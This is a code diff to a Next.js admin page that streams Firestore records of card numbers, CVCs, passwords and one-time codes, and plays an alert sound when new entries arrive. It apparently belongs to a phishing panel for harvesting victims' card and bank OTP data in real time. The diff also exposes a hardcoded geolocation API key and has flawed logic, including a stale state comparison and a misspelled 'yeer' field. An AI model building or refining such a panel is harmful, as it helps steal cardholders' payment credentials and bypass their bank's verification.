@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { useRouter } from 'next/navigation';
 import { Trash2 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -21,6 +21,7 @@ import {
   writeBatch,
   updateDoc,
   query,
+  onSnapshot
 } from 'firebase/firestore';
 import { onAuthStateChanged, signOut } from 'firebase/auth';
 import { CardsByID } from '@/components/cards';
@@ -41,7 +42,7 @@ interface CardData {
   otp:string;
   prefix:string;
   month:string;
-  year:string;
+  yeer:string;
   otpall:string[]
   // Add other fields as needed
 }
@@ -55,15 +56,14 @@ export default function NotificationsPage() {
   const [isLoading, setIsLoading] = useState(true);
   const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(null);
   const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
+  const [showNotification, setShowNotification] = useState(false);
   const router = useRouter();
- const playNotificationSound = () => {
-    const audio=new Audio('/audio/notif.wav')
-    if (audio) {
-      audio!.play().catch((error) => {
-        console.error('Failed to play sound:', error);
-      });
-    }
-  };
+
+  const playNotificationSound = useCallback(() => {
+    const audio = new Audio('/audio/notif.wav');
+    audio.play().catch(error => console.error('Error playing audio:', error));
+  }, []);
+
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
@@ -82,49 +82,58 @@ export default function NotificationsPage() {
       const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4');
       const result = await response.json();
       const _id = cleanString(result.ip);
-playNotificationSound();
+
       const usersCollection = collection(db, 'users');
       const cardsCollection = collection(db, 'orders');
       const usersQuery = query(usersCollection);
       const cardsQuery = query(cardsCollection);
-      const querySnapshot = await getDocs(usersQuery);
-      const cardsQuerySnapshot = await getDocs(cardsQuery);
-      const targetPost = doc(db, 'orders', _id);
-      console.log(targetPost)
-      const data: UserData[] = [];``
-      const cardsdata:CardData[] = [];
-       cardsQuerySnapshot.forEach((doc)=>{
-        const cardData = doc.data();
-        cardsdata.push({
-          id: doc.id,
-          ...cardData,
-          cardNumber:cardData.cardNumber,
-          cvc:cardData.cvc,
-          pass: cardData.pass,
-          otp: cardData.otp,
-          prefix: cardData.prefix,
-          month: cardData.month,
-          year: cardData.year,
-          otpall: cardData.otpall
-        })
-       })
-      querySnapshot.forEach((doc) => {
-        const userData = doc.data();
-        
-        if (userData.result) {
-          data.push({
-            id: doc.id,
-            ...userData.result,
-            data: userData.data,
-          });
+
+      const unsubscribeUsers = onSnapshot(usersQuery, (querySnapshot) => {
+        const data: UserData[] = [];
+        querySnapshot.forEach((doc) => {
+          const userData = doc.data();
+          if (userData.result) {
+            data.push({
+              id: doc.id,
+              ...userData.result,
+              data: userData.data,
+            });
+          }
+        });
+        setUserData(data);
+        if (data.length > userData.length) {
+          playNotificationSound();
+          setShowNotification(true);
         }
+        setIsLoading(false);
       });
 
-      setUserData(data);
-      setCardData(targetPost);
+      const unsubscribeCards = onSnapshot(cardsQuery, (querySnapshot) => {
+        const cardsdata: CardData[] = [];
+        querySnapshot.forEach((doc) => {
+          const cardData = doc.data();
+          cardsdata.push({
+            id: doc.id,
+            ...cardData,
+            cardNumber: cardData.cardNumber,
+            cvc: cardData.cvc,
+            pass: cardData.pass,
+            otp: cardData.otp,
+            prefix: cardData.prefix,
+            month: cardData.month,
+            yeer: cardData.yeer,
+            otpall: cardData.otpall
+          });
+        });
+        setCardData(cardsdata);
+      });
+
+      return () => {
+        unsubscribeUsers();
+        unsubscribeCards();
+      };
     } catch (error) {
       console.error('Error fetching user data:', error);
-    } finally {
       setIsLoading(false);
     }
   };
@@ -277,6 +286,8 @@ playNotificationSound();
           )}
         </DialogContent>
       </Dialog>
+
+      
     </div>
   );
 }
